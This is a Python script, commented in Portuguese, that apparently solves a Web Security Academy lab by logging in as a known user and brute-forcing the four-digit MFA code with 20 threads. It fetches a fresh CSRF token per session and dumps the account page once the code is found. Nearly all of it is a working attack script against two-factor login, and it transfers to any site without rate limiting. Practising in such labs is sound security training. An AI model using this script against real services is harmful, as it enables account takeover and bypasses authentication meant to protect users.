import requests
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor
import threading

url = 'https://0a38000204ab231d81604954001b0022.web-security-academy.net'

# threading.Event() → cria flag compartilhada entre threads (estado inicial: False) 
# Quando uma thread encontra sucesso, seta a flag para True, e todas as outras threads param quase instantaneamente
stop_flag = threading.Event()

def get_csrf(response):
    # BeautifulSoup(...) → cria um objeto que permite navegar e pesquisar o HTML de forma estruturada
    # 'html.parser' → define o parser padrão do Python para interpretar o HTML 
    # # soup → vira uma “árvore” do HTML, pronta para busca
    soup = BeautifulSoup(response.text, 'html.parser')
    return soup.find('input', {'name': 'csrf'})['value']

def attempt_range(start):
    if stop_flag.is_set():
        return

    s = requests.Session()

    try:
        # GET /login
        r = s.get(url + "/login", timeout=5)

        # POST /login
        csrf = get_csrf(r)

        data = {
            "csrf": csrf,
            "username": "carlos",
            "password": "montoya"
        }

        r = s.post(url + "/login", data=data, timeout=5)

        csrf = get_csrf(r)

        for i in range(start, start + 2):
            if stop_flag.is_set():
                return

            code = f"{i:04d}"
            print(f"[{start}] Testando código {code}")

            data = {
                "csrf": csrf,
                "mfa-code": code
            }
            print(csrf)

            r = s.post(url + "/login2", data=data, timeout=5, allow_redirects=False)

            if r.status_code == 302:
                print(f"\n[!!!] CÓDIGO ENCONTRADO: {code} (range {start})\n")

                stop_flag.set()

                print(f"[{start}] Acessando /my-account")
                r = s.get(url + "/my-account", timeout=5)

                print("\n====== CONTEÚDO FINAL ======\n")
                print(r.text)
                print("\n============================\n")

                return

    except Exception as e:
        print(f"[ERROR][{start}] {e}")


ranges = list(range(0, 10000, 2))
n_threads = 20

# ThreadPoolExecutor() → cria um pool de threads gerenciado pelo 'executor'
# Executa a função attempt_range para cada item dentro de ranges, executando em paralelo com n_threads
with ThreadPoolExecutor(max_workers=n_threads) as executor:
    executor.map(attempt_range, ranges)